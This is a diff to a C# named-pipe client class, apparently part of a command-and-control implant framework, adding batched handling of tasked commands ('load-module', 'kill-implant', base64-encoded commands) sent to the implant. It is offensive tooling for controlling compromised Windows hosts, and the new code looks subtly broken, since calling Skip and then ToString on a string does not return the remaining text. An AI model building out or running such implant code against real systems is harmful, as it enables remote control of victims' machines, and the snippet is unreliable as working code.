@@ -2,11 +2,14 @@
 using System.Collections.Generic;
 using System.IO.Pipes;
 using System.IO;
+using System.Linq;
 using System.Text;
 using System.Security.Principal;
 
 public static class PBind
 {
+    private const string MULTI_COMMAND_PREFIX = "multicmd";
+    private const string COMMAND_SEPARATOR = "!d-3dion@LD!-d";
     private static volatile bool _pbindConnected;
     private static volatile NamedPipeClientStream _pipeStream;
     private static volatile StreamReader _pipeReader;
@@ -45,34 +48,50 @@ public static class PBind
 
     private static void HandleCommand(IReadOnlyList<string> args)
     {
-        var taskIdAndCommand = args[0].Trim();
-        var taskId = taskIdAndCommand.Substring(0, 5);
-        var command = taskIdAndCommand.Substring(5);
 
-#if DEBUG
-        Utils.TrimmedPrint("[PBind Client][*] Got encoded taskIdAndCommand: ", taskIdAndCommand);
-        Utils.TrimmedPrint("[PBind Client][*] Got encoded command: ", command);
-#endif
+        var command = args[0].Trim();
 
-        if (!command.StartsWith("load-module") && !command.StartsWith("kill-implant"))
+        string[] commands;
+        if (command.StartsWith(MULTI_COMMAND_PREFIX))
         {
-#if DEBUG
-            Console.WriteLine("[PBind Client][*] Not a load-module or kill-implant, decoding entire command");
-#endif
-            var data = Convert.FromBase64String(command);
-            command = Encoding.UTF8.GetString(data);
+            commands = command.Skip(MULTI_COMMAND_PREFIX.Length).ToString().Split(new[] { COMMAND_SEPARATOR }, StringSplitOptions.RemoveEmptyEntries);
+        }
+        else
+        {
+            commands = new[] { command };
         }
 
-        var newCommand = taskId + command;
-#if DEBUG
-        Utils.TrimmedPrint("New command: ", newCommand);
-#endif
-        IssueCommand(newCommand);
-
-        if (command == "kill-implant" || command == "pbind-unlink")
+        foreach (var taskIdAndCommand in commands)
         {
-            _pbindConnected = false;
-            _pipeStream.Dispose();
+            
+            var taskId = taskIdAndCommand.Substring(0, 5);
+            var individualCommand = taskIdAndCommand.Substring(5);
+
+#if DEBUG
+            Utils.TrimmedPrint("[PBind Client][*] Got encoded taskIdAndCommand: ", taskIdAndCommand);
+            Utils.TrimmedPrint("[PBind Client][*] Got encoded command: ", command);
+#endif
+            var mutableIndividualCommand = individualCommand;
+            if (!mutableIndividualCommand.StartsWith("load-module") && !mutableIndividualCommand.StartsWith("kill-implant"))
+            {
+#if DEBUG
+                Console.WriteLine("[PBind Client][*] Not a load-module or kill-implant, decoding entire command");
+#endif
+                var data = Convert.FromBase64String(mutableIndividualCommand);
+                mutableIndividualCommand = Encoding.UTF8.GetString(data);
+            }
+
+            var newCommand = taskId + mutableIndividualCommand;
+#if DEBUG
+            Utils.TrimmedPrint("New command: ", newCommand);
+#endif
+            IssueCommand(newCommand);
+
+            if (mutableIndividualCommand == "kill-implant" || mutableIndividualCommand == "pbind-unlink")
+            {
+                _pbindConnected = false;
+                _pipeStream.Dispose();
+            }
         }
     }
 
@@ -241,10 +260,11 @@ public static class PBind
                 if (response.TrimEnd('\0') == "COMMAND")
                 {
                     Console.WriteLine("");
+                    _alreadyWaitingForCommand = true;
+                    return;
                 }
 
                 Console.WriteLine(response);
-                _alreadyWaitingForCommand = true;
             }
             catch (Exception e)
             {
